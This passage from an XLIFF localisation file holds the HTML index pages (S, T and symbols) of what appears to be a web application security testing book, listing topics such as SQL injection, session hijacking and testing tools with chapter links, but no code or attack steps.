										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html" style="font-weight:bold;"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch05lev1sec2.html#iddle1487"&gt; sandboxes&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1488"&gt; Santy worm&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1489"&gt; saveuser.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1490"&gt; saving pages&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec2.html#iddle1491"&gt; scanning servers that require SSL&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1492"&gt; script tags&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1493"&gt; scripts, event&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1494"&gt; search.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1495"&gt; second-order injection&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1496"&gt; Secure Sockets Layer (SSL)&lt;/a&gt;&lt;a class="v2" href="app03lev1sec4.html#iddle1497"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1498"&gt; security versus reliability&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1499"&gt; securityfocus.com&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1500"&gt; selectarrangements.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1501"&gt; selectflowers.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1502"&gt; semicolon (;)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1503"&gt; sendmessage.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1504"&gt; sendmessage.php (tellfriend.php)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec2.html#iddle1505"&gt; sensitive user information&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1506"&gt; Server Gated Cryptography (SGC)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1507"&gt; server headers&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec1.html#iddle1508"&gt; server-side programs&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1509"&gt; servers&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec2.html#iddle1510"&gt; scanning servers that require SSL&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1511"&gt; session fixation&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1512"&gt; 2nd&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch04lev1sec2.html#iddle1513"&gt; session hijacking&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1514"&gt; account.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1515"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch04lev1sec2.html#iddle1516"&gt; performing this attack&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1517"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1518"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1519"&gt; session identifiers&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1520"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1521"&gt; session management&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1522"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1523"&gt; SGC (Server Gated Crypto-graphy)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1524"&gt; shopping online&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1525"&gt; showdetails.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec9.html#iddle1526"&gt; signatures on ActiveX controls&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec3.html#iddle1527"&gt; Simple Object Access Protocol (SOAP)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1528"&gt; SiteDigger tool&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1529"&gt; Six Sigma&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec3.html#iddle1530"&gt; SOAP (Simple Object Access Protocol)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1531"&gt; software, cost of faulty software&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1532"&gt; software process improvement&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec1.html#iddle1533"&gt; software testing&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1534"&gt; source code, reading&lt;/a&gt;&lt;a class="v2" href="ch02lev1sec2.html#iddle1535"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1536"&gt; SPIKE Proxy&lt;/a&gt;&lt;a class="v2" href="ch06lev1sec2.html#iddle1537"&gt; 2nd&lt;/a&gt;&lt;a class="v2" href="app03lev1sec8.html#iddle1538"&gt; 3rd&lt;/a&gt;&lt;a class="v2" href="app03lev1sec9.html#iddle1539"&gt; 4th&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch05lev1sec2.html#iddle1540"&gt; SQL injection&lt;/a&gt;&lt;a class="v2" href="ch06lev1sec2.html#iddle1541"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1542"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1543"&gt; checksession.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1544"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1545"&gt; login.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1546"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1547"&gt; showdetails.php&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch07lev1sec2.html#iddle1548"&gt; SQL injection II&amp;mdash;stored procedures&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1549"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1550"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1551"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1552"&gt; SQL queries&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1553"&gt; SSL (Secure Sockets Layer)&lt;/a&gt;&lt;a class="v2" href="app03lev1sec4.html#iddle1554"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1555"&gt; SSLCipherSuite&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1556"&gt; SSLDigger&lt;/a&gt;&lt;a class="v2" href="app03lev1sec10.html#iddle1557"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec1.html#iddle1558"&gt; state&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hidden fields
 [See  &lt;a class="docLink" href="index&amp;amp;view=H.html#iddle1291"&gt;hidden fields&lt;/a&gt;.]&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1560"&gt; state information&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch04lev1sec1.html#iddle1561"&gt; state-based attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CGIparameters
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1109"&gt;CGI parameters&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cookie poisoning
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1160"&gt;cookie poisoning&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hidden fields
 [See  &lt;a class="docLink" href="index&amp;amp;view=H.html#iddle1291"&gt;hidden fields&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;session hijacking
 [See  &lt;a class="docLink" href="index&amp;amp;view=S.html#iddle1513"&gt;session hijacking&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;URL jumping
 [See  &lt;a class="docLink" href="index&amp;amp;view=U.html#iddle1629"&gt;URL jumping&lt;/a&gt;.]&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1567"&gt; stateless&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec1.html#iddle1568"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec1.html#iddle1569"&gt; statelessness&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec2.html#iddle1570"&gt; statistical information&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1571"&gt; stepwise refinement&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1572"&gt; stored procedures&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1573"&gt; removing&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1574"&gt; xp_cmdshell&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1575"&gt; stripslashes&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1576"&gt; structured programming&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec4.html#iddle1577"&gt; Stunnel&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1578"&gt; sub-sites, finding&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1579"&gt; substitution cipher&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1580"&gt; surfing&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=R.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=SYMBOL.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html" style="font-weight:bold;"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch07lev1sec2.html#iddle1001"&gt; ; (semicolon)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1002"&gt; / (HTTP)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1003"&gt; = (equal sign)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1004"&gt; 403 errors&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=T.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=S.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html" style="font-weight:bold;"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch02lev1sec2.html#iddle1581"&gt; tags&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1582"&gt; taint (Perl)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1583"&gt; TCP (Transmission Control Protocol)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1584"&gt; temporary cookies&lt;/a&gt;&lt;br /&gt;testing&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec3.html#iddle1585"&gt; 1970s&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec6.html#iddle1586"&gt; Web clients&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec6.html#iddle1587"&gt; Web servers&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec1.html#iddle1588"&gt; TextPad&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1589"&gt; thin clients&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1590"&gt; third-party components, identifying&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec3.html#iddle1591"&gt; threat profile for Web Services&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1592"&gt; buffer overflow attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1593"&gt; external entity attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1594"&gt; parameter tampering&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1595"&gt; recursive payload attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1596"&gt; WSDL scanning attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1597"&gt; XPATH injection attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1598"&gt; time-out session identifiers&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1599"&gt; TLS (Transport Layer Security)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec4.html#iddle1600"&gt; tools&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec4.html#iddle1601"&gt; BlackWidow&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec6.html#iddle1602"&gt; cURL&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec11.html#iddle1603"&gt; human brain&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec1.html#iddle1604"&gt; Nikto&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1605"&gt; PageSpy tool&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec8.html#iddle1606"&gt; Paros&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec8.html#iddle1607"&gt; SPIKE Proxy&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec10.html#iddle1608"&gt; SSLDigger&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec4.html#iddle1609"&gt; Stunnel&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec1.html#iddle1610"&gt; 